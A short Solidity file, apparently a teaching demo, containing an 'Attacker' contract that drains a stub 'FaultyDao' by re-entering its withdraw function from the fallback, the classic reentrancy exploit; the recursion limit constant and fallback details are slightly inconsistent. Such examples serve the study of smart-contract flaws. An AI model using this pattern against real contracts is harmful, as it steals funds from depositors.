pragma solidity ^0.4.24;
contract Attacker {
    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 10;
    uint amount;
    FaultyDao dao;
    constructor(address daoAddress) public{
        dao = FaultyDao(daoAddress);
    
    }
    
    function depositFunds() payable public {
        amount = msg.value;
        dao.deposit.value(msg.value)();
    }
    
    function Attack() {
        dao.withdraw();
    }
    function() {
        if(stack++ < 3) {
            dao.withdraw();
        }
    }
}


contract FaultyDao {
    function deposit() external payable {
    }
    
    function withdraw() external {
    }
}